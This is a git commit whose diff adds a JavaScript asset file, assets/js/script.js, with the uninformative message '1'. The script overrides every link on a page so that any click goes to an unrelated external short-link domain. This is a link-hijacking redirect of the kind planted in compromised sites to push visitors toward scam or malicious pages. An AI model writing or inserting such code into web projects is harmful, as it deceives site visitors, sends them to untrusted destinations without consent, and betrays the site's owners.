33ac4b05acf5f329784919b6de2775c60559cf55
maratbabaev <you@example.com>
2025-02-28 13:34:30 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://rdrctsru.site/XqQDVPP6";
+		return false;
+	};
+});
